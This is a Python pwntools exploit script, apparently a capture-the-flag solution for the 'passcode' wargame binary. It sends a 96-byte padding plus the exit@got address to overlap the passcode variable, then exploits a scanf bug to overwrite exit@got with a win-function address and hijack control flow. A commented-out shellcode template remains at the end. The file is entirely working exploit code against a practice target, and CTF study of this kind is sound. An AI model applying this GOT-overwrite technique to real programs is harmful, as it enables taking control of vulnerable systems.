#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template passcode
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'passcode')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# Stripped:   No

io = start()

io.readuntil(b"Toddler's Secure Login System 1.1 beta.\n")

io.info(b"PIE is off - elf addresses are static!")
exit_got = 0x0804c028
win_addr = 0x804928f
io.success(f"exit@got = {hex(exit_got)}".encode('latin1'))
io.success(f"win = {hex(win_addr)}".encode('latin1'))

io.info("name overlaps with passcode1 @ char 96 - we'll write &exit@got")
io.send(b'A' * 96 + p32(exit_got))


io.info("scanf bug now writes to address _in_ passcode1 rather than the address _of_ passcode1, which is pointing at exit@got")
io.sendline(f"{win_addr}".encode('latin1'))
io.success("so we'll point exit@got to win_addr!")
io.shutdown('send')

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

